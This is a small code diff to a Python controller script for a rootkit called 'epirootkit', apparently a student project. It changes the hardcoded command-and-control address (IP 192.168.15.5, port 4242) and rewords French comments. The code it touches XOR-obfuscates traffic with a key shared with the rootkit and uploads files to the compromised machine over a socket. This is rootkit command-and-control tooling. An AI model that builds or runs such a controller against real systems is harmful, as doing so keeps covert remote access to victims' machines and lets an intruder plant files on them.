@@ -4,9 +4,9 @@ import os
 import sys
 import time
 
-SERVER_IP = "10.0.2.15"
+SERVER_IP = "192.168.15.5"
 PORT = 4242
-KEY = b"epirootkit"  # même clé que côté rootkit
+KEY = b"epirootkit"  # On utilise la même clé que côté rootkit
 
 def xor(data, key):
     return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
@@ -36,7 +36,7 @@ def upload_file(sock, local_path, remote_path):
         size = len(data)
         command = f"upload {remote_path} {size}"
         send(sock, command)
-        time.sleep(0.1)  # Attendre que le rootkit soit prêt
+        time.sleep(0.1)  # On attend que le rootkit soit prêt
         sock.sendall(data)
         response = recv(sock)
         print(response)
